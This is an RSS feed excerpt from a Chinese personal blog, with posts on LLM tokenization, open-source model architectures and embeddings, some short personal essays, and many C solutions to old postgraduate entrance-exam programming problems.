<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on LINTENG&#39;S BLOG</title>
    <link>/post/</link>
    <description>Recent content in Posts on LINTENG&#39;S BLOG</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 30 Aug 2023 00:00:00 +0000</lastBuildDate><atom:link href="/post/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>大模型中的token</title>
      <link>/post/llm_token/</link>
      <pubDate>Wed, 30 Aug 2023 00:00:00 +0000</pubDate>
      
      <guid>/post/llm_token/</guid>
      <description>token是什么？
  大模型训练、推理本仍然是数值计算，文本通过分词、转换得到的数字即为token，不同模型采用不同词表得到的token不同。例如 算法工程师 在gpt3模型中对应的token是 [163, 106, 245, 37345, 243, 32432, 98, 163, 101, 233, 30585, 230]
  openai计费单位，按照输入token，输出token数量计算费用。 注意 input token 和 output token价格一般不同。openai计费价格，千帆大模型平台价格
    token是怎么计算的？
通过openai提供的在线工具测试英文、中文 token结果如下：
  英文
TOKEN IDS [31373, 644, 338, 534, 1438, 30] openai给出的经验法则是，对于普通英文文本，一个token通常对应约4个字符的文本。这大约相当于一个单词的3/4（因此100个token~=75个单词）。
  中文
中文分词一个汉字可能对应多个token。
  tiktoken
tiktoken是openai开源的token工具，
1）生成 算法工程师 token id list。
2）对每一个token还原可以得到token id代表的字节，例如：163 代表 b&#39;\xe7&#39;。对比算法工程师 utf-8 字节，可以发现与上述token id转换得到的字节一致。
import tiktoken text = &amp;#34;算法工程师&amp;#34; enc = tiktoken.</description>
    </item>
    
    <item>
      <title>开源LLM</title>
      <link>/post/llm_diff/</link>
      <pubDate>Wed, 30 Aug 2023 00:00:00 +0000</pubDate>
      
      <guid>/post/llm_diff/</guid>
      <description>LLMs LLaMA、GPT、Transformer 1）我们经常说GPT是transformer右侧部分，其实GPT不包含transformer右侧中间的Multi-Head Attention模块。
2）LLaMA在GPT基础上对多个组件优化。
 https://dugas.ch/artificial_curiosity/GPT_architecture.html
  https://zhuanlan.zhihu.com/p/636784644
 支持中英文开源大模型 三种主流架构的注意力模式比较。
  蓝色: 前缀 token 之间的注意力
  绿色: 前缀 token 和目标 token 之间的注意力
  黄色: 目标 token 之间的注意力
  灰色: 掩码注意力
    Causal Decoder // 单向注意力
1）LLaMA
  1.1 LLaMA 从零训练：Baichuan-7B/13B（百川智能）、Qwen-7B（阿里云）
  1.2 LLaMA 增量微调：BELLE-7B/13B（链家）
  2）GPT、ChatGPT、BLOOM
  Prefix Decoder // Encoder双向注意力、Decoder单向注意力、Encoder&amp;amp;Decoder共享参数
1）ChatGLM-6B、ChatGLM2-6B（清华、智谱）
  Encoder-Decoder // Encoder双向注意力、Decoder单向注意力</description>
    </item>
    
    <item>
      <title>瑞幸抢我一块一毛九</title>
      <link>/post/%E7%91%9E%E5%B9%B8%E6%8A%A2%E6%88%91%E4%B8%80%E5%9D%97%E4%B8%80%E6%AF%9B%E4%B9%9D/</link>
      <pubDate>Thu, 08 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>/post/%E7%91%9E%E5%B9%B8%E6%8A%A2%E6%88%91%E4%B8%80%E5%9D%97%E4%B8%80%E6%AF%9B%E4%B9%9D/</guid>
      <description>&lt;p&gt;Q: app付款后退款你会检查退款金额吗？&lt;/p&gt;
&lt;p&gt;A: 大部分时间不会，今天无意瞟了一眼发现了问题，对不上！&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>LLM Embedding</title>
      <link>/post/llm_embedding/</link>
      <pubDate>Wed, 07 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>/post/llm_embedding/</guid>
      <description>LLM Embedding ChatGLM   ChatGLM获取Embedding向量
inputs = tokenizer([text], return_tensors=&amp;#34;pt&amp;#34;).to(device) resp = model.transformer(**inputs, output_hidden_states=True) y = resp.last_hidden_state y_mean = torch.mean(y, dim=0, keepdim=True) y_mean = y_mean.cpu().detach().numpy() print(y_mean.shape) &amp;gt; [1, 4096]   </description>
    </item>
    
    <item>
      <title>LLM Develop Tools</title>
      <link>/post/llm_develop_tools/</link>
      <pubDate>Wed, 31 May 2023 00:00:00 +0000</pubDate>
      
      <guid>/post/llm_develop_tools/</guid>
      <description>&lt;h2 id=&#34;motivation&#34;&gt;Motivation&lt;/h2&gt;
&lt;p&gt;如何开发以下需求？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;业务 （Models、Prompt）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;多模型（gpt-3.5, gpt-4, chatglm-6b, chatglm-6b-ft）&lt;/li&gt;
&lt;li&gt;多业务（运营push、个性化push、weibo地域、商业评论、新闻评论……）&lt;/li&gt;
&lt;li&gt;不同业务 X 不同模型 = 不同prompt&lt;/li&gt;
&lt;li&gt;敏感词风控&lt;/li&gt;
&lt;li&gt;输出标准化json格式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;网页 （Memory）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;多轮对话&lt;/li&gt;
&lt;li&gt;控制记忆上限（按轮数、按token[全量, 摘要……]）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;外部数据 （Indexes）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;汽车博文生成，需要参考车型各类参数（pdf，md, txt……）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;任务拆分 （Chain）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;汽车博文3段式生成
&lt;ol&gt;
&lt;li&gt;根据brief =》开头&lt;/li&gt;
&lt;li&gt;根据brief、开头 =》 中间&lt;/li&gt;
&lt;li&gt;根据开头、中间 =》结尾&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;日志（Callbacks）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;过程日志统计、token统计……&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;……&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;工具&#34;&gt;工具&lt;/h2&gt;
&lt;p&gt;目前开源工具包括以下几种：llama_index、langchain、semantic-kernel等。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>对彩礼的理解</title>
      <link>/post/%E5%AF%B9%E5%BD%A9%E7%A4%BC%E7%9A%84%E7%90%86%E8%A7%A3/</link>
      <pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate>
      
      <guid>/post/%E5%AF%B9%E5%BD%A9%E7%A4%BC%E7%9A%84%E7%90%86%E8%A7%A3/</guid>
      <description>&lt;h2 id=&#34;婚姻及结婚&#34;&gt;婚姻及结婚&lt;/h2&gt;
&lt;p&gt;婚姻是以感情为基础的平等契约，结婚是恋爱达到一定阶段后需要法律及世俗认可的一个过程。&lt;/p&gt;
&lt;p&gt;我可以理解没有感情的婚姻，但我不支持。（从这点看，我可能也是一个理想主义者）&lt;/p&gt;
&lt;p&gt;结婚是两个人之间的事，尽量避免变成两个家庭之间的博弈，如果双方父辈有分歧，情侣应该统一战线推动分歧的解决。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>对统治与被统治的理解</title>
      <link>/post/%E5%AF%B9%E7%BB%9F%E6%B2%BB%E4%B8%8E%E8%A2%AB%E7%BB%9F%E6%B2%BB%E7%9A%84%E7%90%86%E8%A7%A3/</link>
      <pubDate>Wed, 11 May 2022 00:00:00 +0000</pubDate>
      
      <guid>/post/%E5%AF%B9%E7%BB%9F%E6%B2%BB%E4%B8%8E%E8%A2%AB%E7%BB%9F%E6%B2%BB%E7%9A%84%E7%90%86%E8%A7%A3/</guid>
      <description>&lt;p&gt;如果一定把人划分为不同的阶级，只有统治阶级和被统治阶级&lt;/p&gt;
&lt;p&gt;人性决定了理想国不会存在&lt;/p&gt;
&lt;p&gt;所谓政体、制度亦不过是统治阶级与被统治阶级博弈的结果&lt;/p&gt;
&lt;p&gt;被统治阶级注定要被剥削&lt;/p&gt;
&lt;p&gt;和动物世界的弱肉强食没什么本质区别&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>我的考研路</title>
      <link>/post/%E6%88%91%E7%9A%84%E8%80%83%E7%A0%94%E8%B7%AF/</link>
      <pubDate>Thu, 06 Apr 2017 00:00:00 +0000</pubDate>
      
      <guid>/post/%E6%88%91%E7%9A%84%E8%80%83%E7%A0%94%E8%B7%AF/</guid>
      <description>&lt;h3 id=&#34;写在前面&#34;&gt;写在前面&lt;/h3&gt;
&lt;p&gt;坐在图书馆看着毕老师的JAVA教程，虽然不是第一次看了，但是想系统的学一遍。看着周围正在准备考研的学弟学妹们，刚过去不久的考研画面，不断地浮现在我的脑海里。考研我并不是一个成功者，但是这段经历一直在影响我，所以我决定写下来，写在我的博客上！&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>2006-一-4</title>
      <link>/post/2006-%E4%B8%80-4/</link>
      <pubDate>Tue, 13 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2006-%E4%B8%80-4/</guid>
      <description>int main() { char *p[2][3]={&amp;#34;Hello&amp;#34;,&amp;#34;world&amp;#34;,&amp;#34;student&amp;#34;,&amp;#34;computer&amp;#34;,&amp;#34;end&amp;#34;,&amp;#34;the&amp;#34;}; printf(&amp;#34;%c\n&amp;#34;,***(p+1)); printf(&amp;#34;%c\n&amp;#34;,**p[0]); printf(&amp;#34;%c\n&amp;#34;,(*(*(p+1)+1))[2]); printf(&amp;#34;%c\n&amp;#34;,*(p[1][2]+1)); printf(&amp;#34;%s\n&amp;#34;,**(p+1)); } </description>
    </item>
    
    <item>
      <title>模拟一-三-3</title>
      <link>/post/%E6%A8%A1%E6%8B%9F%E4%B8%80-%E4%B8%89-3/</link>
      <pubDate>Mon, 12 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/%E6%A8%A1%E6%8B%9F%E4%B8%80-%E4%B8%89-3/</guid>
      <description>#include&amp;lt;stdio.h&amp;gt;int main() { char i,j,k;//i是A的对手，j是B的对手，k是C的对手 	for (i = &amp;#39;x&amp;#39;; i &amp;lt;= &amp;#39;z&amp;#39;; i++) { for (j = &amp;#39;x&amp;#39;; j &amp;lt;= &amp;#39;z&amp;#39;; j++) { if (i != j) { for (k = &amp;#39;x&amp;#39;; k &amp;lt;= &amp;#39;z&amp;#39;; k++) { if (i != k&amp;amp;&amp;amp;j != k) { if (i != &amp;#39;x&amp;#39;&amp;amp;&amp;amp;k != &amp;#39;x&amp;#39;&amp;amp;&amp;amp;k != &amp;#39;z&amp;#39;) { printf(&amp;#34;A——%c\nB——%c\nC——%c\n&amp;#34;, i, j, k); } } } } } } return 0; } </description>
    </item>
    
    <item>
      <title>2003-c-二-2</title>
      <link>/post/2003-c-%E4%BA%8C-2/</link>
      <pubDate>Sat, 10 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2003-c-%E4%BA%8C-2/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt; int main() { int k; char c; for(k=1,c=&amp;#39;A&amp;#39;;c&amp;lt;&amp;#39;F&amp;#39;;k++) { switch(++c) { case &amp;#39;A&amp;#39;:k++;break; case &amp;#39;B&amp;#39;:k*=2;break; case &amp;#39;C&amp;#39;:k--; case &amp;#39;D&amp;#39;:k%=3;continue; default:k+=2; case &amp;#39;E&amp;#39;:k/=2; case &amp;#39;F&amp;#39;:k++; } k++; } printf(&amp;#34;%d&amp;#34;,k); } </description>
    </item>
    
    <item>
      <title>2002-c-四-2</title>
      <link>/post/2002-c-%E5%9B%9B-2/</link>
      <pubDate>Thu, 08 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2002-c-%E5%9B%9B-2/</guid>
      <description>参考链接
 http://wenku.baidu.com/link?url=ur0W1vrgSqLfcAXz9-_uWFXGXjCdOzaq7uKmJ6mw_Zhs18s86ZfvgKteukXH4LPdqojg_rNo8Tivll9p8b78Ptw_dAEVgzMbFG4dWGR4ay_
 #define maxSize 1000  #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt; int main() { char a[maxSize]; int i,n; for(n=0;n&amp;lt;maxSize;n++) { scanf(&amp;#34;%c&amp;#34;,&amp;amp;a[n]); if(a[n]==&amp;#39;\n&amp;#39;) break; } for(i=0;i&amp;lt;n;++i) { if(a[i]==&amp;#39;f&amp;#39;&amp;amp;&amp;amp;a[i+1]==&amp;#39;r&amp;#39;&amp;amp;&amp;amp;a[i+2]==&amp;#39;o&amp;#39;&amp;amp;&amp;amp;a[i+3]==&amp;#39;m&amp;#39;) a[i]=a[i+1]=a[i+2]=a[i+3]=&amp;#39;\0&amp;#39;; if((a[i]==&amp;#39;i&amp;#39;&amp;amp;&amp;amp;a[i+1]==&amp;#39;n&amp;#39;)|| (a[i]==&amp;#39;a&amp;#39;&amp;amp;&amp;amp;a[i+1]==&amp;#39;t&amp;#39;)|| (a[i]==&amp;#39;a&amp;#39;&amp;amp;&amp;amp;a[i+1]==&amp;#39;n&amp;#39;)|| (a[i]==&amp;#39;o&amp;#39;&amp;amp;&amp;amp;a[i+1]==&amp;#39;n&amp;#39;) ) a[i]=a[i+1]=&amp;#39;\0&amp;#39;; } for(i=0;i&amp;lt;n;++i) { if(a[i]==&amp;#39;\0&amp;#39;) continue; printf(&amp;#34;%c&amp;#34;,a[i]); } return 0; } </description>
    </item>
    
    <item>
      <title>2002-c-四-4</title>
      <link>/post/2002-c-%E5%9B%9B-4/</link>
      <pubDate>Thu, 08 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2002-c-%E5%9B%9B-4/</guid>
      <description>//快速排序非递归算法，递归算法天勤p234
void swap(int &amp;amp;in1, int &amp;amp;in2) { int tmp = in1; in1 = in2; in2 = tmp; } int qsort_partition(int A[], int q, int r) { int i, j, k = A[r]; for (i = q, j = q-1; i &amp;lt; r; i++) { if (A[i] &amp;lt; k) { swap(A[++j], A[i]); } } swap(A[++j], A[r]); return j; } void qsort(int A[], int N) { if (A &amp;amp;&amp;amp; N &amp;gt; 0) { stack&amp;lt;int&amp;gt; stk; stk.</description>
    </item>
    
    <item>
      <title>2002-d-五</title>
      <link>/post/2002-d-%E4%BA%94/</link>
      <pubDate>Thu, 08 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2002-d-%E4%BA%94/</guid>
      <description>/** 算法思想：1.分别求出此节点的左子树与右子树的高度 2.做差即为平衡因子 3.递归遍历二叉树 **/ //求二叉树深度 int depth(BTNode *bt) { if(bt!=NULL) { int l=depth(bt-&amp;gt;lchild); int r=depth(bt-&amp;gt;rchild); return l&amp;gt;r?l+1:r+1; } return 0; } //递归求二叉树每个结点的平衡因子 void balance(BTNode *bt) { if(bt!=NULL) { balance(bt-&amp;gt;lchild); balance(bt-&amp;gt;rchild); int l=depth(bt-&amp;gt;lchild); int r=depth(bt-&amp;gt;rchild); printf(&amp;#34;%d&amp;#34;,l-r); } } </description>
    </item>
    
    <item>
      <title>2002-d-四</title>
      <link>/post/2002-d-%E5%9B%9B/</link>
      <pubDate>Thu, 08 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2002-d-%E5%9B%9B/</guid>
      <description>/** 基本思想：采取逆先序遍历方法，判断结点是否为叶子节点，在访问右子树、最后访问左子树 **/ int arr[maxSize];int k=0; void del(BTNode *bt) { if(bt!=NULL) { if(bt-&amp;gt;lchld==NULL&amp;amp;&amp;amp;bt-&amp;gt;rchild==NULL) { arr[k++]=bt-&amp;gt;data; free(bt); bt=NULL; } else { del(bt-&amp;gt;rchild);//注意此时的顺序  del(bt-&amp;gt;lchild); } } } </description>
    </item>
    
    <item>
      <title>2002</title>
      <link>/post/2002/</link>
      <pubDate>Wed, 07 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2002/</guid>
      <description> http://wenku.baidu.com/link?url=JkAd9TULbhz6--1Tt7jseTi5Gw2gqfCWF6VnVqy-NzZwFkatKTDUXZfYoiWTswuOdLMyoyOkaa6sXWz1X6JnO_tVASd901XTvj7Pr7c2j_q
 /** 基本思想：采取逆先序遍历方法，判断结点是否为叶子节点，在访问右子树、最后访问左子树 **/ int arr[maxSize];int k=0; void del(BTNode *bt) { if(bt!=NULL) { if(bt-&amp;gt;lchld==NULL&amp;amp;&amp;amp;bt-&amp;gt;rchild==NULL) { arr[k++]=bt-&amp;gt;data; free(bt); bt=NULL; } else { del(bt-&amp;gt;rchild);//注意此时的顺序  del(bt-&amp;gt;lchild); } } } </description>
    </item>
    
    <item>
      <title>2001-c-三</title>
      <link>/post/2001-c-%E4%B8%89/</link>
      <pubDate>Mon, 05 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2001-c-%E4%B8%89/</guid>
      <description>void common(char *str,char *sub) { int i=0,j=0,k=0,max=0; for(i=0;str[i]!=&amp;#39;\0&amp;#39;;++i) { j=0; k=i; while(str[k]==sub[j]) { ++k; ++j; } if(j&amp;gt;max) max=j; } sub[max]=&amp;#39;\0&amp;#39;; printf(&amp;#34;%s&amp;#34;,sub); } int main() { char str1[40]=&amp;#34;123456123456vhgaaasdd&amp;#34;; char str2[20]=&amp;#34;123456vhgvhg&amp;#34;; common(str1,str2); } </description>
    </item>
    
    <item>
      <title>2001-c-五</title>
      <link>/post/2001-c-%E4%BA%94/</link>
      <pubDate>Mon, 05 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2001-c-%E4%BA%94/</guid>
      <description>int similar(BTNode *n1,BTNode *n2) { if((n1==NULL)&amp;amp;&amp;amp;(n2==NULL))//都为空  return 1;//相似  else//有一个不空，或都不空  { if((n1==NULL)||(n2==NULL))//有一个不空  return 0; else return similar(n1-&amp;gt;lchild,n2-&amp;gt;lchild)&amp;amp;&amp;amp;similar(n1-&amp;gt;rchild,n2-&amp;gt;rchild);//继续判断  } } </description>
    </item>
    
    <item>
      <title>2000-d-五</title>
      <link>/post/2000-d-%E4%BA%94/</link>
      <pubDate>Sun, 04 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2000-d-%E4%BA%94/</guid>
      <description>//此算法特别巧妙，此处只为精华版，完整部分链接
 http://blog.csdn.net/arcsinsin/article/details/10238505
 btree * DeleteBST(btree *b, ElemType x) { if (b) { if (b-&amp;gt;data == x) b = DelNode(b); else if (b-&amp;gt;data &amp;gt; x) //注意此处的b-&amp;gt;lchild、b-&amp;gt;rchild 无此句，会出现删除后断链情况  b-&amp;gt;lchild = DeleteBST(b-&amp;gt;lchild, x); else b-&amp;gt;rchild = DeleteBST(b-&amp;gt;rchild, x); } return b; } //删除结点，准确的说是调整数值，删除无用结点 btree * DelNode(btree *p) { if (p-&amp;gt;lchild) { btree *r = p-&amp;gt;lchild; //r指向其左子树;  btree *prer = p-&amp;gt;lchild; //prer指向其左子树;  while(r-&amp;gt;rchild != NULL)//搜索左子树的最右边的叶子结点r  { prer = r; r = r-&amp;gt;rchild; } p-&amp;gt;data = r-&amp;gt;data; if(prer !</description>
    </item>
    
    <item>
      <title>1999-c-五</title>
      <link>/post/1999-c-%E4%BA%94/</link>
      <pubDate>Sat, 03 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1999-c-%E4%BA%94/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt;#define maxSize 100 /** 打开方式&amp;#34;wb&amp;#34;（二进制文件）无法换行 &amp;#34;w&amp;#34;可以换行 &amp;#34;wb+&amp;#34;可读可写 **/ int main() { FILE *fin; char name[maxSize]; char age[maxSize]; char sex[maxSize]; char depart[maxSize]; char salary[maxSize]; if((fin=fopen(&amp;#34;file.txt&amp;#34;,&amp;#34;wb+&amp;#34;))==NULL) printf(&amp;#34;open error&amp;#34;); else { fprintf(fin,&amp;#34;%20s&amp;#34;,&amp;#34;王教授&amp;#34;); fprintf(fin,&amp;#34;%20s&amp;#34;,&amp;#34;45&amp;#34;); fprintf(fin,&amp;#34;%20s&amp;#34;,&amp;#34;男&amp;#34;); fprintf(fin,&amp;#34;%20s&amp;#34;,&amp;#34;计算机&amp;#34;); fprintf(fin,&amp;#34;%20s&amp;#34;,&amp;#34;80000&amp;#34;); fseek(fin,-20L,SEEK_END); fscanf(fin,&amp;#34;%20s&amp;#34;,salary); printf(&amp;#34;%s\n&amp;#34;,salary); fseek(fin,-40L,SEEK_END); fscanf(fin,&amp;#34;%20s&amp;#34;,depart); printf(&amp;#34;%s\n&amp;#34;,depart); fseek(fin,-60L,SEEK_END); fscanf(fin,&amp;#34;%20s&amp;#34;,sex); printf(&amp;#34;%s\n&amp;#34;,sex); fseek(fin,-80L,SEEK_END); fscanf(fin,&amp;#34;%20s&amp;#34;,age); printf(&amp;#34;%s\n&amp;#34;,age); fseek(fin,-100L,SEEK_END); fscanf(fin,&amp;#34;%20s&amp;#34;,name); printf(&amp;#34;%s\n&amp;#34;,name); } } </description>
    </item>
    
    <item>
      <title>2000-c-7</title>
      <link>/post/2000-c-7/</link>
      <pubDate>Sat, 03 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2000-c-7/</guid>
      <description>void merge(int arg1[],int n,int arg2[],int m) { int arg3[maxSize]; int i=0,j=0,k=0,l=0; while(i&amp;lt;n&amp;amp;&amp;amp;j&amp;lt;m) { if(arg1[i]&amp;lt;arg2[j]) arg3[k++]=arg1[i++]; if(arg1[i]&amp;gt;arg2[j]) arg3[k++]=arg2[j++]; } if(i&amp;lt;n) while(i&amp;lt;n) arg3[k++]=arg1[i++]; if(j&amp;lt;m) while(j&amp;lt;m) arg3[k++]=arg2[j++]; while(l&amp;lt;k)//复制到arg1中  { arg1[l]=arg3[l]; ++l; } } </description>
    </item>
    
    <item>
      <title>1999-c-六</title>
      <link>/post/1999-c-%E5%85%AD/</link>
      <pubDate>Fri, 02 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1999-c-%E5%85%AD/</guid>
      <description>//将指针转化为数组形式进行操作 #include &amp;lt;stdio.h&amp;gt; char *RRSindex (char *str,char *substr) { int i=0;//主串工作指针  int j=0;//子串工作指针  int k=0;//每次开始比较位置  int p=0;//最后一个位置  for(i=0;str[i]!=&amp;#39;\0&amp;#39;;i++) { k=i;//记录本次比较开始位置  j=0;//每次子串从头开始  while((str[i]!=&amp;#39;\0&amp;#39;)&amp;amp;&amp;amp;(substr[j]!=&amp;#39;\0&amp;#39;)&amp;amp;&amp;amp;(str[i]==substr[j])) { i++; j++; } if(substr[j]==&amp;#39;\0&amp;#39;)//匹配  { p=k; } } //printf(&amp;#34;%d&amp;#34;,p);  return &amp;amp;str[p]; } int main() { char str[100]=&amp;#34;xxx123xxx123xx&amp;#34;; char substr[100]=&amp;#34;123&amp;#34;; RRSindex(str,substr); } </description>
    </item>
    
    <item>
      <title>1999-c-四</title>
      <link>/post/1999-c-%E5%9B%9B/</link>
      <pubDate>Thu, 01 Dec 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1999-c-%E5%9B%9B/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt; typedef struct student { float grade; struct student *next; } student; struct student *SortLink(struct student *head) { struct student *pre,*p,*pre_m,*m,*n; float min;//最小值  n=NULL;//将指针变为空，用于区别是否为首次插入  while(head-&amp;gt;next!=NULL) { pre=head; p=head-&amp;gt;next;//工作指针  m=p; pre_m=pre; min=p-&amp;gt;grade;//最小值信息初始化  while(p!=NULL) { if(p-&amp;gt;grade&amp;lt;min) { min=p-&amp;gt;grade; m=p;//保留当前次最小值地址  pre_m=pre; } p=p-&amp;gt;next; pre=pre-&amp;gt;next; } pre_m-&amp;gt;next=m-&amp;gt;next;//将最小值结点从当前链表移除  if(n==NULL)//第一个结点  { n=m; } else { m-&amp;gt;next=n; n=m;//采用头插法  } } return n; } </description>
    </item>
    
    <item>
      <title>1997-c-一-1-(2)</title>
      <link>/post/1997-c-%E4%B8%80-1-2/</link>
      <pubDate>Wed, 30 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1997-c-%E4%B8%80-1-2/</guid>
      <description></description>
    </item>
    
    <item>
      <title>1998-c-三</title>
      <link>/post/1998-c-%E4%B8%89/</link>
      <pubDate>Wed, 30 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1998-c-%E4%B8%89/</guid>
      <description>/* 算法思想：打开文件、按格式读入文件、 统计歌名以及演唱者的字符长度、重新拼接写入新文件 */ #include &amp;lt;stdio.h&amp;gt;#define N 10 #define M 3 #define maxSize 100  int main() { FILE *fin,*fout;//定义读入指针以及写指针  char song[maxSize]; char singer[maxSize]; int len1,len2; char str1[maxSize]; char str2[maxSize]; char str3[maxSize]; if((fout=fopen(&amp;#34;NewSong.txt&amp;#34;,&amp;#34;w&amp;#34;))==NULL)//打开失败  printf(&amp;#34;open out error&amp;#34;); if((fin=fopen(&amp;#34;song.txt&amp;#34;,&amp;#34;r&amp;#34;))==NULL)//打开失败  printf(&amp;#34;open in error\n&amp;#34;); else//打开成功  { while(!feof(fin)) { // fscanf(fin,&amp;#34;%Ns%Ms&amp;#34;,song,singer);//此处无法使用宏常量，具体原因不明  fscanf(fin,&amp;#34;%10s%3s&amp;#34;,song,singer); fprintf(fout,&amp;#34;%d&amp;#34;,strlen(song)); fprintf(fout,&amp;#34;%d&amp;#34;,strlen(singer)); fprintf(fout,&amp;#34;%s&amp;#34;,song); fprintf(fout,&amp;#34;%s&amp;#34;,singer); } fclose(fin); fclose(fout); } } </description>
    </item>
    
    <item>
      <title>1996-c-三</title>
      <link>/post/1996-c-%E4%B8%89/</link>
      <pubDate>Tue, 29 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/1996-c-%E4%B8%89/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt;#define maxSize 100  int main() { int i=1,j,k,l,d;//循环变量  int n;//平方数  int m=0;//数组下标  int arr[maxSize];//存储平方数集合  int num[10];//暂存数组  int flag=0;//标记  while(1)//生成三位平方数  { n=i*i; if(n&amp;gt;99&amp;amp;&amp;amp;n&amp;lt;1000) arr[++m]=n;//数组下标从1开始  if(n&amp;gt;1000) break; i++; } for(i=1;i&amp;lt;=m;i++)//判断构成三组数不重复  { num[1]= arr[i] / 1 % 10; num[2]= arr[i] / 10 % 10; num[3]= arr[i] / 100 % 10; for(j=i+1;j&amp;lt;=m;j++) { num[4]= arr[j] / 1 % 10; num[5]= arr[j] / 10 % 10; num[6]= arr[j] / 100 % 10; for(k=j+1;k&amp;lt;=m;k++) { num[7]= arr[k] / 1 % 10; num[8]= arr[k] / 10 % 10; num[9]= arr[k] / 100 % 10; flag=0;//重复标记初始化，每次都需初始化  //判断是否重复  for(l=1;l&amp;lt;=9;l++) { for(d=l+1;d&amp;lt;=9;d++) { if(num[l]==num[d]) flag=1; } } if(flag==0) //如果不重复  { printf(&amp;#34;%d %d %d\n&amp;#34;,arr[i],arr[j],arr[k]); } } } } } </description>
    </item>
    
    <item>
      <title>2006-d-四</title>
      <link>/post/2006-d-%E5%9B%9B/</link>
      <pubDate>Fri, 11 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2006-d-%E5%9B%9B/</guid>
      <description>/** 本题有各种答案，无论是学姐的还是红皮书都是错误的。 正确思想在于采用拓扑排序，也是本题考点。深度优先搜索等无法解决。 **/ typedef struct VNode { char data; int no; int count; ArcNode *firstarc; }VNode;//重新定义邻接表表头结点  int TopSort(AGraph *G) { int i,j ,n=0; int stack[maxSize],top=-1;//定义并初始化栈  ArcNode *p; for(i=1;i&amp;lt;G-&amp;gt;n;++i) { if(G-&amp;gt;adjlist[i].count==0) stack[++top]=i; } while(top!=-1) { i=stack[top--]; ++n;//计数器加1  G-&amp;gt;adjlist[i].no=n;//将整形序号赋值给结点  p=G-&amp;gt;adjlist[i].firstarc; while(p!=NULL) { j=p-&amp;gt;adjvex; --(G-&amp;gt;adjlist[j].count); if(G-&amp;gt;adjlist[j].count==0) stack[++top]=j; p=p-&amp;gt;nextarc; } } if(n==G-&amp;gt;n) return 1; else return 0; } </description>
    </item>
    
    <item>
      <title>2006-c-三</title>
      <link>/post/2006-c-%E4%B8%89/</link>
      <pubDate>Thu, 10 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2006-c-%E4%B8%89/</guid>
      <description>/*三.由键盘输入n(n&amp;lt;50)个英文单词，每个单词由空格分隔。试编写一个递归函数，判断这n个单词是否是按字典顺序排列的。*/ #include&amp;lt;stdio.h&amp;gt;#include&amp;lt;string.h&amp;gt;#define MAXSIZE 50 int WordSort(char word[][15], int n) { if (n &amp;lt; 0) return -1; else if (n == 1) return 1; else { if(strcmp(word[n-1], word[n-2])&amp;gt;0 &amp;amp;&amp;amp; WordSort(word, n-1))//下标从0开始最后一个为n-1  return 1; else return 0; } } void main() { char word[MAXSIZE][15]; int size, i; printf(&amp;#34;输入单词个数,小于50:\n&amp;#34;); scanf(&amp;#34;%d&amp;#34;, &amp;amp;size); printf(&amp;#34;\n输入%d单词,以空格隔开:\n&amp;#34;, size); for (i = 0; i &amp;lt; size; i++) scanf(&amp;#34;%s&amp;#34;, word[i]); switch (WordSort(word, size)) { case -1: printf(&amp;#34;\n请输入单词\n&amp;#34;);break; case 0: printf(&amp;#34;\n输入的单词不是按字典顺序排序!</description>
    </item>
    
    <item>
